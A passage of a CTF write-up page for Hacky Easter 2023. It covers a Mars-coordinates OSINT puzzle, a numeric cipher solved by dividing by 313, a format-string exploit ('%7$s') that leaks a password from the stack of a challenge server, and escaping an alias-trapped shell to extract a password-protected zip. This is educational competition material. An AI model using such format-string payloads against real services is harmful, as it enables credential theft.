45.007 4.335
</pre></table></code></div></div><p>🚩 Flag</p><ul><li>the first word of the thing you find<li>six lowercase letters<li>wrapped in flag format, e.g. he2023{thingy}</ul><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We look up the coordinates in Google Maps, 3 of them are for french observatories, the fourth on (<code class="language-plaintext highlighter-rouge">45.960 0.090</code>) leads us to an empty field, so that must be the one that doesn’t make sense.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>48.998 2.008  # Observatoire de Triel
45.960 0.090  # ??
43.579 1.524  # Le sentier des planètes
45.007 4.335  # Planète Mars Observatoire Hubert Reeves
</pre></table></code></div></div><p>Since the other 3 lead to observatories, what if the coordinates are to another planet? Let’s try Mars first since that is part of the name of one of the observatories.</p><p>We use NASA’s website <a href="https://trek.nasa.gov/mars/">Mars Trek</a> and go to the coordinates <code class="language-plaintext highlighter-rouge">45.960 0.090</code>. There is a crater right there! We find it’s name is Davies crater.</p><p><img src="writeupfiles/davies-crater.png" alt="" /></p><p>And that is indeed the flag!</p><h2> Flag</h2><code> he2023{davies} </code><hr><h1 id="spy-tricks"> Spy Tricks <a href="/writeups/HackyEaster_2023/level4-6-spy-tricks.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The bunny spymaster found a tiny note in a forgotten dead drop and is now scratching her head; she’s sure she once knew the code, but there are too many swirling aorund in her head right now. Can you help her decipher the message?</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre><td class="rouge-code"><pre>27231 21597 10016 20971 24727 24414 22223 25666 20345 26292
26605 23788 20345 26292 21597 10016 27857 24727 26605 10016
24727 24414 10016 20345 10016 25979 20345 21910 21597 10016
20345 25666 25666 22849 26918 20345 23788 14398 10016 27231
21597 10016 20971 24727 24414 21910 22849 25666 24101 10016
26292 22536 21597 10016 25666 21597 20971 21597 22849 25040
26292 10016 24727 21910 10016 27857 24727 26605 25666 10016
23788 21597 26292 26292 21597 25666 10016 26292 24727 10016
26292 22536 21597 10016 20345 21284 21284 25666 21597 25979
25979 10016 26918 10016 25666 21597 25040 21597 20345 26292
10016 26918 10016 20345 24414 21284 10016 26292 22536 21597
10016 25666 21597 20345 21284 22849 24414 22223 10016 24727
21910 10016 23788 21597 26292 26292 21597 25666 10016 24414
26605 24101 20658 21597 25666 10016 15337 14398 03130 32552
31613 15650 15024 15650 15963 38499 22849 29735 33804 32865
33491 31613 29735 15963 15024 15963 29735 30674 15963 36308
36308 31613 35682 29735 30674 36621 36308 29735 36308 32552
30361 36308 35995 29735 34430 15024 36308 29735 35056 35682
15337 34117 31613 39125 03130 26292 22536 21597 10016 25040
20345 20971 23475 20345 22223 21597 10016 27231 20345 25979
10016 21284 21597 23788 22849 26918 21597 25666 21597 21284
10016 26292 24727 10016 27857 24727 26605 25666 10016 27231
22849 21910 21597 10016 25040 21597 25666 25979 24727 24414
20345 23788 23788 27857 14398 10016 21597 26918 21597 25666
27857 26292 22536 22849 24414 22223 10016 22849 25979 10016
20345 23788 23788 10016 25666 22849 22223 22536 26292 10016
27231 22849 26292 22536 10016 26292 22536 21597 10016 21910
20345 24101 22849 23788 27857 14398 10016 27231 21597 10016
27231 22849 25979 22536 10016 27857 24727 26605 10016 25979
26605 20971 20971 21597 25979 25979 14398 10016 22223 25666
21597 21597 26292 22849 24414 22223 25979 10016 21910 25666
24727 24101 10016 26292 22536 21597 10016 20971 24727 24101
25666 20345 21284 21597 25979 14398 10016 24414 26605 24101
20658 21597 25666 10016 15337 13772 10016 15963 25666 21284
10016 24727 21910 10016 21284 21597 20971 21597 24101 20658
21597 25666 14398 03130
</pre></table></code></div></div><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We applied random characters to this and put it through a cryptogram solver which go us .. quite close</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>WESCONGRATULATESYOUSONSASBAFESARRISALYSWESCONFIRMSTHESRECEIPTSOFSYOURSLETTERSTOSTHESADDREBBSSSREPEATSSSANDSTHESREADINGSOFSLETTERSNUMVERSJYUAXQZQXMIZDVCXZXZXZQXKKXHZQLKZKAJKIZFZKZGHJEXNUTHESPACKAGESWABSDELISEREDSTOSYOURSWIFESPERBONALLYYS
</pre></table></code></div></div><p>and then took that into python where we made more progress with a 52 character subtitution alphabet:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>we congratulate you on a safe arrival. we confirm the receipt of your letter to the address v repeat v and the reading of letter number 1.
HE2023{i_LIKE_303_D3SSEQ_DRS_SHCSP_O0S_NQ1ME}
the package was delivered to your wife personally. everything is all right with the family. we wish you success. greetings from the comrades. number 1: 3rd of december.
</pre></table></code></div></div><p>Saskia eventually got this into</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>HE2023{i_LIKE_303_B3TTER_BUT_THATS_N0T_PR1ME}
</pre></table></code></div></div><p>Which we tried, and then tried lower case which wasn’t right (:eyes:)</p><p>So we tried doing it their way which was clearly intended and did a common factor finder and oh whoopsie it was actually really simple:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="n">data</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">intercepted_message.txt</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="p">).</span><span class="nf">read</span><span class="p">().</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="se">\n</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="p">).</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="nf">map</span><span class="p">(</span><span class="nb">int</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">([</span><span class="nf">chr</span><span class="p">(</span><span class="n">x</span> <span class="o">//</span> <span class="mi">313</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">data</span><span class="p">]))</span>
</pre></table></code></div></div><p>and wow that was really simple, we just forgot to also capitalise the I when we uncapitalised the rest:</p><h2> Flag</h2><code> he2023{I_like_303_b3tter_but_thats_n0t_pr1me} </code><hr><h1 id="thumper-s-pwn-3"> Thumper's PWN 3 <a href="/writeups/HackyEaster_2023/level5-1-thumpers-pwn-3.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Thumper has been hunting his nemesis, Dr. Evil, for months. He finally located his remote system and is trying to gain access. Can you help him find the right password?</p><p>Target: <code class="language-plaintext highlighter-rouge">nc ch.hackyeaster.com 2313</code></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>we find out its a format string vulnerability and read values off the stack.</p><p>we get something interesting by giving <code class="language-plaintext highlighter-rouge">%7$s</code> as the password</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nc ch.hackyeaster.com 2313

Welcome to the password protected vault
Please enter your password: %7<span class="nv">$s</span>
Nope..
5uP3R_s3cUr3_PW
is incorrect. Better luck next <span class="nb">time</span>
</pre></table></code></div></div><p>we use this password to log in and get our flag!</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nc ch.hackyeaster.com 2313

Welcome to the password protected vault
Please enter your password: 5uP3R_s3cUr3_PW
Access granted, here is your flag:

he2023<span class="o">{</span>w3lc0m3_t0_r1ng_3_thump3r<span class="o">}</span>
</pre></table></code></div></div><h2> Flag</h2><code> he2023{w3lc0m3_t0_r1ng_3_thump3r} </code><hr><h1 id="ghost-in-a-shell"> Ghost in a Shell <a href="/writeups/HackyEaster_2023/level5-2-ghost-in-a-shell-4.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>  _, _,_  _,  _, ___   _ _, _    _,    _, _,_ __, _,  _,    , ,   ,
 / _ |_| / \ (_   |    | |\ |   /_\   (_  |_| |_  |   |     | \   /
 \ / | | \ / , )  |    | | \|   | |   , ) | | |   | , | ,   |  \ /
  ~  ~ ~  ~   ~   ~    ~ ~  ~   ~ ~    ~  ~ ~ ~~~ ~~~ ~~~   ~   ~
______________________________________________________________________
 ,--.     ,--.     ,--.     ,--.
| oo |   | oo |   | oo |   | oo |
| ~~ |   | ~~ |   | ~~ |   | ~~ |  o  o  o  o  o  o  o  o  o  o  o  o
|/\/\|   |/\/\|   |/\/\|   |/\/\|
______________________________________________________________________
</pre></table></code></div></div><p>Connect to the server, snoop around, and find the flag!</p><ul><li>ssh <code class="language-plaintext highlighter-rouge">ch.hackyeaster.com -p 2306 -l blinky</code><li>password is: <code class="language-plaintext highlighter-rouge">blinkblink</code></ul><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Let’s log in and see what we have:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
</pre><td class="rouge-code"><pre><span class="nv">$ </span>ssh ch.hackyeaster.com <span class="nt">-p</span> 2306 <span class="nt">-l</span> blinky
blinky@ch.hackyeaster.com<span class="s1">'s password:

  _, _,_  _,  _, ___   _ _, _    _,    _, _,_ __, _,  _,    , ,   ,
 / _ |_| / \ (_   |    | |\ |   /_\   (_  |_| |_  |   |     | \   /
 \ / | | \ / , )  |    | | \|   | |   , ) | | |   | , | ,   |  \ /
  ~  ~ ~  ~   ~   ~    ~ ~  ~   ~ ~    ~  ~ ~ ~~~ ~~~ ~~~   ~   ~
______________________________________________________________________
 ,--.     ,--.     ,--.     ,--.
| oo |   | oo |   | oo |   | oo |
| ~~ |   | ~~ |   | ~~ |   | ~~ |  o  o  o  o  o  o  o  o  o  o  o  o
|/\/\|   |/\/\|   |/\/\|   |/\/\|
______________________________________________________________________

Find the flag!
ab81e1e4280b:~$ ls
about.txt
blinky
flag.txt
ab81e1e4280b:~$ cat flag.txt
|\---/|
| o_o |  meow!
 \___/
ab81e1e4280b:~$ less flag.txt
|\---/|
| o_o |  meow!
 \___/
ab81e1e4280b:~$ more flag.txt
|\---/|
| o_o |  meow!
 \___/
ab81e1e4280b:~$ ls -la
about.txt
blinky
flag.txt
</span></pre></table></code></div></div><p>ok, a bunch of commands are acting weird, let’s see if they setup some aliases to make our lives difficult.. yep!</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">alias
alias </span><span class="nv">ash</span><span class="o">=</span><span class="s1">'exit'</span>
<span class="nb">alias </span><span class="nv">bash</span><span class="o">=</span><span class="s1">'echo "you are not a bash brother" &amp;&amp; exit'</span>
<span class="nb">alias cat</span><span class="o">=</span><span class="s1">'echo "|\---/|" &amp;&amp; echo "| o_o |  meow!" &amp;&amp; echo " \___/" #'</span>
<span class="nb">alias cd</span><span class="o">=</span><span class="s1">'/bin/true'</span>
<span class="nb">alias </span><span class="nv">egrep</span><span class="o">=</span><span class="s1">'echo "" #'</span>
<span class="nb">alias </span><span class="nv">fgrep</span><span class="o">=</span><span class="s1">'echo "" #'</span>
<span class="nb">alias </span><span class="nv">find</span><span class="o">=</span><span class="s1">'echo "command not found: find" #'</span>
<span class="nb">alias </span><span class="nv">fzip</span><span class="o">=</span><span class="s1">'/usr/bin/zip -P "/bin/funzip"'</span>
<span class="nb">alias grep</span><span class="o">=</span><span class="s1">'echo "" #'</span>
<span class="nb">alias id</span><span class="o">=</span><span class="s1">'echo "uid=0(root) gid=0(root) groups=0(root)"'</span>
<span class="nb">alias </span><span class="nv">java</span><span class="o">=</span><span class="s1">'echo "command not found: java" #'</span>
<span class="nb">alias </span><span class="nv">less</span><span class="o">=</span><span class="s1">'echo "|\---/|" &amp;&amp; echo "| o_o |  meow!" &amp;&amp; echo " \___/" #'</span>
<span class="nb">alias ls</span><span class="o">=</span><span class="s1">'/bin/ls /home/blinky | /bin/grep -v home #'</span>
<span class="nb">alias </span><span class="nv">more</span><span class="o">=</span><span class="s1">'echo "|\---/|" &amp;&amp; echo "| o_o |  meow!" &amp;&amp; echo " \___/" #'</span>
<span class="nb">alias pwd</span><span class="o">=</span><span class="s1">'echo /home/blinky #'</span>
<span class="nb">alias </span><span class="nv">python</span><span class="o">=</span><span class="s1">'echo "command not found: python" #'</span>
<span class="nb">alias </span><span class="nv">vi</span><span class="o">=</span><span class="s1">'echo "command not found: vi" #'</span>
<span class="nb">alias </span><span class="nv">vim</span><span class="o">=</span><span class="s1">'echo "command not found: vim" #'</span>
<span class="nb">alias whoami</span><span class="o">=</span><span class="s1">'echo "you are you"'</span>
<span class="nb">alias </span><span class="nv">zip</span><span class="o">=</span><span class="s1">'echo "command not found: zip" #'</span>
<span class="nb">alias </span><span class="nv">zsh</span><span class="o">=</span><span class="s1">'exit'</span>
</pre></table></code></div></div><p>to fix this we do</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>$ unalias sh
$ sh
</pre></table></code></div></div><p>to get a clean shell</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre>ab81e1e4280b:~<span class="nv">$ </span><span class="nb">unalias </span>sh
ab81e1e4280b:~<span class="nv">$ </span>sh
b81e1e4280b:~<span class="nv">$ </span><span class="nb">cat </span>about.txt
Blinky, ankaŭ konata kiel Akabei, estas la gvidanto de la Fantomoj kaj la ĉefmalamiko de Pac-Man. Li ankaŭ estas prezentita kiel la plej agresema fantomo kiu ĉiam postkuras Pac-Man, kaj malfacilas skui post kiam li komencas. Li povas havi humoron, kaj estas bonaj amikoj kun Pinky, Inky, kaj Clyde. Li ankaŭ havas filinon nomitan Yum-Yum.

Dum origine la ĉefantagonisto en la unua Pac-Man arkadludo, lia antagonisma rolo de la franĉizo estis plejparte malpliigita al aliancano en lastatempaj enkarniĝoj, kvankam li daŭre estas konsiderita la serio-fakta ĉefa antagonisto en refilmigoj de la unua matĉo kaj de pli maljunaj adorantoj.

ab81e1e4280b:~<span class="nv">$ </span><span class="nb">cat </span>flag.txt
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣶⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⠿⠟⠛⠻⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀don<span class="s1">'t try⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣆⣀⣀⠀⣿⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀- brute force⠀⠀⠀⠀⠀⠀⢸⠻⣿⣿⣿⠅⠛⠋⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀- wordlists⠀⠀⠀⠀⠀⠀⠀⠀⠘⢼⣿⣿⣿⣃⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣟⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣛⣛⣫⡄⠀⢸⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⡆⠸⣿⣿⣿⡷⠂⠨⣿⣿⣿⣿⣶⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣾⣿⣿⣿⣿⡇⢀⣿⡿⠋⠁⢀⡶⠪⣉⢸⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⡏⢸⣿⣷⣿⣿⣷⣦⡙⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣇⢸⣿⣿⣿⣿⣿⣷⣦⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣵⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⡁⠀
</span></pre></table></code></div></div><p>The text is Esperanto, Google translates it as</p><p><em>Blinky, also known as Akabei, is the leader of the Ghosts and Pac-Man’s archenemy. He is also depicted as the most aggressive ghost who always chases Pac-Man, and is hard to shake once he starts. He can have a temper, and is good friends with Pinky, Inky, and Clyde. He also has a daughter named Yum-Yum. While originally the main antagonist in the first Pac-Man arcade game, his antagonistic role of the franchise has been largely diminished to an ally in recent incarnations, although he is still considered the series-de facto main antagonist in remakes of the first game and by older fans.</em></p><p>We also find another directory that was previously hidden from us by the <code class="language-plaintext highlighter-rouge">ls</code> alias, in it we find a zip file (with a curious <code class="language-plaintext highlighter-rouge">.fzip</code> extension):</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>ab81e1e4280b:~<span class="nv">$ </span><span class="nb">ls
</span>about.txt  blinky     flag.txt   home
ab81e1e4280b:~<span class="nv">$ </span><span class="nb">ls </span>home/
blinky
ab81e1e4280b:~<span class="nv">$ </span><span class="nb">ls </span>home/blinky/
blinkyflag.fzip
ab81e1e4280b:~<span class="nv">$ </span><span class="nb">cd </span>home/blinky/
ab81e1e4280b:~/home/blinky<span class="nv">$ </span>unzip blinkyflag.fzip
Archive:  blinkyflag.fzip
<span class="o">[</span>blinkyflag.fzip] flag.txt password:
password incorrect--reenter:
password incorrect--reenter:
   skipping: flag.txt                incorrect password
</pre></table></code></div></div><p>We are told we don’t need to brutforce of guess the password, so there must be a hint to the password around here somewhere..</p><p>We look more closely to the aliases they set up, and see</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">alias </span><span class="nv">fzip</span><span class="o">=</span><span class="s1">'/usr/bin/zip -P "/bin/fyunzip"'</span>
</pre></table></code></div></div><p>ah! they fzipped it, which was an alias for zipping with password <code class="language-plaintext highlighter-rouge">/bin/funzip</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>ab81e1e4280b:~/home/blinky<span class="nv">$ </span>unzip <span class="nt">-P</span> <span class="s2">"/bin/funzip"</span> blinkyflag.fzip
Archive:  blinkyflag.fzip
error:  cannot create flag.txt
        Permission denied
</pre></table></code></div></div><p>arg, so close, but we don’t have permissions to create the unzipped file..</p><p>let’s just get the zip file off the server and do it locally</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>ab81e1e4280b:~/home/blinky$ cat blinkyflag.fzip | base64
UEsDBAoACQAAABCUNlVt6MFvLgAAACIAAAAIABwAZmxhZy50eHRVVAkAAyCOLGMgjixjdXgLAAEE
9QEAAAQUAAAAUr8PpJEFxM8HYAIupC/n3QYqp8g44yt7Z/fJ6CdpTcNVM403V0iMcz9C8hb3DFBL
Bwht6MFvLgAAACIAAABQSwECHgMKAAkAAAAQlDZVbejBby4AAAAiAAAACAAYAAAAAAABAAAApIEA
AAAAZmxhZy50eHRVVAUAAyCOLGN1eAsAAQT1AQAABBQAAABQSwUGAAAAAAEAAQBOAAAAgAAAAAAA
</pre></table></code></div></div><p>and then locally:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>$ echo "UEsDBAoACQAAABCUNlVt6MFvLgAAACIAAAAIABwAZmxhZy50eHRVVAkAAyCOLGMgjixjdXgLAAEE
9QEAAAQUAAAAUr8PpJEFxM8HYAIupC/n3QYqp8g44yt7Z/fJ6CdpTcNVM403V0iMcz9C8hb3DFBL
Bwht6MFvLgAAACIAAABQSwECHgMKAAkAAAAQlDZVbejBby4AAAAiAAAACAAYAAAAAAABAAAApIEA
AAAAZmxhZy50eHRVVAUAAyCOLGN1eAsAAQT1AQAABBQAAABQSwUGAAAAAAEAAQBOAAAAgAAAAAAA
" | base64 -d &gt; pacman.fzip
$ unzip -P "/bin/funzip" pacman.fzip
Archive:  pacman.fzip
 extracting: flag.txt
$ cat flag.txt
he2023{al1asses-4-fUn-and-pr0fit}

